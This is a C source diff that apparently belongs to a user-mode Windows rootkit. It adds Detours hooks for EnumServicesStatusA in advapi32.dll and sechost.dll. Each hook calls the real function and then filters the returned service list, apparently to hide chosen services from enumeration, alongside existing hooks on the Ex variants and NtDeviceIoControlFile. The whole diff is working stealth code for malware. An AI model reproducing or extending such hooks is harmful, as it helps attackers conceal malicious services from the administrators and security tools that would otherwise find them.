@@ -19,6 +19,8 @@ static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA;
 static NT_ENUMSERVICESSTATUSEXA OriginalEnumServicesStatusExA2;
+static NT_ENUMSERVICESSTATUSA OriginalEnumServicesStatusA;
+static NT_ENUMSERVICESSTATUSA OriginalEnumServicesStatusA2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 
 VOID InitializeHooks()
@@ -36,6 +38,8 @@ VOID InitializeHooks()
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("advapi32.dll", "EnumServicesStatusExA", (LPVOID*)&OriginalEnumServicesStatusExA, HookedEnumServicesStatusExA);
 	InstallHook("sechost.dll", "EnumServicesStatusExA", (LPVOID*)&OriginalEnumServicesStatusExA2, HookedEnumServicesStatusExA2);
+	InstallHook("advapi32.dll", "EnumServicesStatusA", (LPVOID*)&OriginalEnumServicesStatusA, HookedEnumServicesStatusA);
+	InstallHook("sechost.dll", "EnumServicesStatusA", (LPVOID*)&OriginalEnumServicesStatusA2, HookedEnumServicesStatusA2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	DetourTransactionCommit();
 
@@ -60,6 +64,8 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalEnumServicesStatusExA, HookedEnumServicesStatusExA);
 	UninstallHook(OriginalEnumServicesStatusExA2, HookedEnumServicesStatusExA2);
+	UninstallHook(OriginalEnumServicesStatusA, HookedEnumServicesStatusA);
+	UninstallHook(OriginalEnumServicesStatusA2, HookedEnumServicesStatusA2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	DetourTransactionCommit();
 }
@@ -763,6 +769,30 @@ static BOOL WINAPI HookedEnumServicesStatusExA2(SC_HANDLE serviceManager, SC_ENU
 	if (result && services && servicesReturned)
 	{
 		FilterEnumServiceStatusProcessA((LPENUM_SERVICE_STATUS_PROCESSA)services, servicesReturned);
+	}
+
+	return result;
+}
+static BOOL WINAPI HookedEnumServicesStatusA(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle)
+{
+	// ANSI version for advapi32.dll (non-Ex version)
+	BOOL result = OriginalEnumServicesStatusA(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusA((LPENUM_SERVICE_STATUSA)services, servicesReturned);
+	}
+
+	return result;
+}
+static BOOL WINAPI HookedEnumServicesStatusA2(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle)
+{
+	// ANSI version for sechost.dll (non-Ex version, Windows 10+)
+	BOOL result = OriginalEnumServicesStatusA2(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle);
+
+	if (result && services && servicesReturned)
+	{
+		FilterEnumServiceStatusA((LPENUM_SERVICE_STATUSA)services, servicesReturned);
 	}
 
 	return result;
